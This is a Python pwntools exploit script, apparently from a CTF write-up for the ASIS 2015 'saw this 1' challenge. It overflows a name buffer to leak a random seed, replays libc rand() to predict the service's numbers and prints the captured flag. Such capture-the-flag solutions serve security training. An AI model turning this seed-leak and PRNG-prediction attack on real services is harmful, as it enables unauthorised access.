# Unmodified Source https://www.whitehatters.academy/asis-ctf-quals-2015-saw-this-1/

from pwn import *
from math import floor
from ctypes import *
import re

# Allows us to call functions from their lib so we know they have the same functionality/implementation of functions
# TODO: Doesn't work, segmentation fault!
#strProvidedLIBC = "./libc.so.6"
#LIBC = ctypes.cdll.LoadLibrary(strProvidedLIBC)

LIBC = CDLL("libc.so.6")
H,P='localhost',6666

def gen_rand():
    global LIBC
    return float(LIBC.rand()) / float(2147483647.0);

r = remote(H,P)

junk = r.recvuntil("How can I call you? ")

username = "A"*0x40
r.sendline(username)  # Send 64 A's so that no \0 byte is written to the end, meaning we should be able to leak out the random seed

junk += r.recvuntil('Welcome, '+username)
seed = r.recv(4)
with open('seed','wb') as f: f.write(seed)
# Convert this sequence of little endian bytes to a integer
seed = u32(seed)
# Create a empty buffer of 8 length
state = create_string_buffer(8) 
# Set the state of the PRNG (like they do in their hidden function called at the start)
LIBC.initstate(0, state, 8)
# Seed the PRNG with the value that we leaked out
LIBC.srand(seed)

# Wait until it asks for the 'lucky number' and send 0 as lucky number
junk += r.recvuntil("Choose your lucky number (1-100)! But choose wisely, your life depends on it: ")
r.sendline("0")

# Use saw-this-1 algorithm to determine number of random numbers
lennums = int(floor((gen_rand()* 13.0) + 4.0))

# Use saw-this-1 algorithm to calculate random numbers
nums = [floor(gen_rand() * 256.0) for x in range(lennums)]

payload = "".join([str(nums[x])+'\n' for x in range(lennums)])

junk += r.recvuntil('Number #1: ')
r.sendline(payload)
junk += r.recvline()  # Read up until the end, where the flag will be (should end with '}') and print it out, completing part one.
# print junk
res = re.findall(r'ASIS{.*}', junk)
if len(res) > 0:
    print 'Flag:',res[0]
else:
    print 'Flag not found! If you are testing locally: echo "ASIS{109096cca8948d1cebee782a11d2472b}" > freedom'
